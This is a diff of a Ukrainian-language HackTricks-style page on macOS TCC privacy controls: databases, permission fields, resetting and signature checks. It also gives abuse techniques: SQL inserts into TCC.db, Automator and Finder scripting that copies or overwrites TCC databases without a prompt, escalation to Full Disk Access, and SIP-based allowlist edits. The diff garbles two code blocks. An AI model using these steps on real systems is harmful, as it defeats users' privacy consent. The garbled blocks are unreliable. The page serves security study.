@@ -27,11 +27,13 @@
 Є **tccd у режимі користувача**, який працює для кожного ввійшовшого користувача, визначений у `/System/Library/LaunchAgents/com.apple.tccd.plist`, реєструючи служби mach `com.apple.tccd` та `com.apple.usernotifications.delegate.com.apple.tccd`.
 
 Тут ви можете побачити tccd, який працює в системі та в режимі користувача:
+
 ```bash
 ps -ef | grep tcc
 0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
 501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
 ```
+
 Дозволи **успадковуються від батьківського** додатка, а **дозволи відстежуються** на основі **ідентифікатора пакета** та **ідентифікатора розробника**.
 
 ### Бази даних TCC
@@ -135,6 +137,7 @@ sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
 <summary>Як виконати, якщо це абсолютний шлях</summary>
 
 Просто виконайте **`launctl load you_bin.plist`**, з файлом plist, подібним до:
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -171,11 +174,13 @@ sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
 </dict>
 </plist>
 ```
+
 </details>
 
 * **`auth_value`** може мати різні значення: відхилено(0), невідомо(1), дозволено(2) або обмежено(3).
 * **`auth_reason`** може приймати наступні значення: Помилка(1), Згода користувача(2), Встановлено користувачем(3), Встановлено системою(4), Політика служби(5), Політика MDM(6), Політика заміщення(7), Відсутній рядок використання(8), Тайм-аут запиту(9), Невідомий передполіт(10), Наданий доступ(11), Політика типу додатку(12)
 * Поле **csreq** вказує на те, як перевірити виконання бінарного файлу та надати дозволи TCC:
+
 ```bash
 # Query to get cserq in printable hex
 select service, client, hex(csreq) from access where auth_value=2;
@@ -191,6 +196,7 @@ echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
 REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
 echo "X'$REQ_HEX'"
 ```
+
 * Для отримання додаткової інформації про **інші поля** таблиці [**перевірте цей допис у блозі**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).
 
 Ви також можете перевірити **вже надані дозволи** для додатків у `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.
@@ -200,6 +206,7 @@ echo "X'$REQ_HEX'"
 {% endhint %}
 
 #### Скидання дозволів TCC
+
 ```bash
 # You can reset all the permissions given to an application with
 tccutil reset All app.some.id
@@ -207,6 +214,7 @@ tccutil reset All app.some.id
 # Reset the permissions granted to all apps
 tccutil reset All
 ```
+
 ### Перевірки підпису TCC
 
 База даних TCC зберігає **ідентифікатор пакета** додатка, а також **інформацію** про **підпис**, щоб **переконатися**, що додаток, який просить дозвіл, є правильним.
@@ -237,6 +245,7 @@ csreq -t -r /tmp/telegram_csreq.bin
 Однак, для додатків, щоб **отримати доступ** до **певних папок користувача**, таких як `~/Desktop`, `~/Downloads` та `~/Documents`, їм **не потрібно мати** жодних конкретних **повноважень.** Система буде прозоро керувати доступом та **запитувати користувача** за необхідності.
 
 Додатки Apple **не будуть генерувати вікна запитів**. Вони містять **передбачені права** у своєму **списку повноважень**, що означає, що вони **ніколи не згенерують спливаюче вікно**, **і** вони не будуть відображатися в жодній з **баз даних TCC.** Наприклад:
+
 ```bash
 codesign -dv --entitlements :- /System/Applications/Calendar.app
 [...]
@@ -247,6 +256,7 @@ codesign -dv --entitlements :- /System/Applications/Calendar.app
 <string>kTCCServiceAddressBook</string>
 </array>
 ```
+
 Це дозволить Календарю не запитувати користувача про доступ до нагадувань, календаря та адресної книги.
 
 {% hint style="success" %}
@@ -264,6 +274,7 @@ codesign -dv --entitlements :- /System/Applications/Calendar.app
 ### Намір користувача / com.apple.macl
 
 Як вже зазначалося, можливо **надати доступ до файлу програмі за допомогою перетягування його на неї**. Цей доступ не буде вказаний в жодній базі даних TCC, але як **розширений** **атрибут файлу**. Цей атрибут буде **зберігати UUID** дозволеної програми:
+
 ```bash
 xattr Desktop/private.txt
 com.apple.macl
@@ -278,6 +289,7 @@ Filename,Header,App UUID
 otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
 uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
 ```
+
 {% hint style="info" %}
 Цікаво, що атрибут **`com.apple.macl`** керується **Sandbox**, а не tccd.
 
@@ -295,45 +307,9 @@ uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
 <details>
 
 <summary>Приклад вставки в TCC</summary>
-```sql
-INSERT INTO access (
-service,
-client,
-client_type,
-auth_value,
-auth_reason,
-auth_version,
-csreq,
-policy_id,
-indirect_object_identifier_type,
-indirect_object_identifier,
-indirect_object_code_identity,
-flags,
-last_modified,
-pid,
-pid_version,
-boot_uuid,
-last_reminded
-) VALUES (
-'kTCCServiceSystemPolicyDesktopFolder', -- service
-'com.googlecode.iterm2', -- client
-0, -- client_type (0 - bundle id)
-2, -- auth_value  (2 - allowed)
-3, -- auth_reason (3 - "User Set")
-1, -- auth_version (always 1)
-X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
-NULL, -- policy_id
-NULL, -- indirect_object_identifier_type
-'UNUSED', -- indirect_object_identifier - default value
-NULL, -- indirect_object_code_identity
-0, -- flags
-strftime('%s', 'now'), -- last_modified with default current timestamp
-NULL, -- assuming pid is an integer and optional
-NULL, -- assuming pid_version is an integer and optional
-'UNUSED', -- default value for boot_uuid
-strftime('%s', 'now') -- last_reminded with default current timestamp
-);
-```
+
+\`\`\`sql INSERT INTO access ( service, client, client\_type, auth\_value, auth\_reason, auth\_version, csreq, policy\_id, indirect\_object\_identifier\_type, indirect\_object\_identifier, indirect\_object\_code\_identity, flags, last\_modified, pid, pid\_version, boot\_uuid, last\_reminded ) VALUES ( 'kTCCServiceSystemPolicyDesktopFolder', -- service 'com.googlecode.iterm2', -- client 0, -- client\_type (0 - bundle id) 2, -- auth\_value (2 - allowed) 3, -- auth\_reason (3 - "User Set") 1, -- auth\_version (always 1) X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now NULL, -- policy\_id NULL, -- indirect\_object\_identifier\_type 'UNUSED', -- indirect\_object\_identifier - default value NULL, -- indirect\_object\_code\_identity 0, -- flags strftime('%s', 'now'), -- last\_modified with default current timestamp NULL, -- assuming pid is an integer and optional NULL, -- assuming pid\_version is an integer and optional 'UNUSED', -- default value for boot\_uuid strftime('%s', 'now') -- last\_reminded with default current timestamp ); \`\`\`
+
 </details>
 
 ### TCC Пейлоади
@@ -399,25 +375,14 @@ EOD
 <details>
 
 <summary>Отримати оболонку всередині Automator</summary>
-```applescript
-osascript<<EOD
-set theScript to "touch /tmp/something"
 
-tell application "Automator"
-set actionID to Automator action id "com.apple.RunShellScript"
-tell (make new workflow)
-add actionID to it
-tell last Automator action
-set value of setting "inputMethod" to 1
-set value of setting "COMMAND_STRING" to theScript
-end tell
-execute it
-end tell
-activate
-end tell
-EOD
-# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
-```
+\`\`\`applescript osascript<
+
+tell application "Automator" set actionID to Automator action id "com.apple.RunShellScript" tell (make new workflow) add actionID to it tell last Automator action set value of setting "inputMethod" to 1 set value of setting "COMMAND\_STRING" to theScript end tell execute it end tell activate end tell EOD
+
+## Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
+
+````
 </details>
 
 Те ж саме відбувається з **додатком Script Editor,** він може керувати Finder, але за допомогою AppleScript ви не можете змусити його виконати скрипт.
@@ -465,12 +430,14 @@ EOD
 # File operations in the folder should trigger the Folder Action
 touch "$HOME/Desktop/file"
 rm "$HOME/Desktop/file"
-```
-### Автоматизація (SE) + Доступність (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** до FDA\*
+````
+
+#### Автоматизація (SE) + Доступність (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** до FDA\*
 
 Автоматизація на **`System Events`** + Доступність (**`kTCCServicePostEvent`**) дозволяє відправляти **натискання клавіш процесам**. Таким чином ви можете зловживати Finder, щоб змінити базу даних користувачів TCC або надати FDA довільній програмі (хоча для цього може знадобитися пароль).
 
 Приклад перезапису Finder бази даних користувачів TCC:
+
 ```applescript
 -- store the TCC.db file to copy in /tmp
 osascript <<EOF
@@ -516,31 +483,32 @@ keystroke "v" using {command down}
 end tell
 EOF
 ```
-### `kTCCServiceAccessibility` до FDA\*
+
+#### `kTCCServiceAccessibility` до FDA\*
 
 Перевірте цю сторінку для деяких [**пейлоадів для зловживання дозволами на доступність**](macos-tcc-payloads.md#accessibility) для підвищення привілеїв до FDA\* або запуску keylogger, наприклад.
 
-### **Клієнт захисту кінцевої точки до FDA**
+#### **Клієнт захисту кінцевої точки до FDA**
 
 Якщо у вас є **`kTCCServiceEndpointSecurityClient`**, у вас є FDA. Кінець.
 
-### Системний файл політики SysAdmin до FDA
+#### Системний файл політики SysAdmin до FDA
 
 **`kTCCServiceSystemPolicySysAdminFiles`** дозволяє **змінювати** атрибут **`NFSHomeDirectory`** користувача, що змінює його домашню теку і, отже, дозволяє **обійти TCC**.
 
-### База даних користувача TCC до FDA
+#### База даних користувача TCC до FDA
 
 Отримавши **права на запис** у базі даних **користувача TCC**, ви не можете надати собі права **`FDA`**, тільки той, хто проживає в системній базі даних, може надати це.
 
 Але ви можете дати собі **права на автоматизацію для Finder**, і скористатися попередньою технікою для підвищення до FDA\*.
 
-### **FDA до дозволів TCC**
+#### **FDA до дозволів TCC**
 
 **Повний доступ до диска** у TCC називається **`kTCCServiceSystemPolicyAllFiles`**
 
 Я не думаю, що це справжнє підвищення привілеїв, але на всякий випадок, якщо ви керуєте програмою з FDA, ви можете **змінити базу даних користувачів TCC і надати собі будь-який доступ**. Це може бути корисним як техніка постійності у випадку, якщо ви втратите свої права FDA.
 
-### **Обхід SIP для обходу TCC**
+#### **Обхід SIP для обходу TCC**
 
 База даних системи **TCC** захищена **SIP**, тому тільки процеси з **вказаними привілеями можуть змінювати** її. Тому, якщо зловмисник знаходить **обхід SIP** над **файлом** (може змінювати файл, обмежений SIP), він зможе:
 
@@ -551,11 +519,14 @@ EOF
 
 Однак є ще один варіант зловживання цим **обходом SIP для обходу TCC**, файл `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` є списком дозволених додатків, які потребують винятку TCC. Тому, якщо зловмисник може **видалити захист SIP** з цього файлу та додати свій **власний додаток**, додаток зможе обійти TCC.\
 Наприклад, щоб додати термінал:
+
 ```bash
 # Get needed info
 codesign -d -r- /System/Applications/Utilities/Terminal.app
 ```
+
 AllowApplicationsList.plist:
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -578,29 +549,14 @@ AllowApplicationsList.plist:
 </dict>
 </plist>
 ```
-### Обхід TCC
 
-{% content-ref url="macos-tcc-bypasses/" %}
-[macos-tcc-bypasses](macos-tcc-bypasses/)
-{% endcontent-ref %}
+#### Обхід TCC
 
-## Посилання
+### Посилання
 
 * [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
 * [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
 * [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
 * [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
-
-<details>
-
-<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
-
-Інші способи підтримки HackTricks:
-
-* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
-* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
-* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.
 
 </details>
